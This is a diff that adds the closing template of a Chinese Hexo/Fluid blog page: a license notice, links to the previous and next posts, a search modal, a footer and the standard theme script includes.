+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/05/08/PwnThyBytes-2019-Baby-SQL/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">[PwnThyBytes 2019]Baby_SQL</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/05/05/nodejs%E5%AD%A6%E4%B9%A0/">
+                        <span class="hidden-mobile">nodejs学习</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
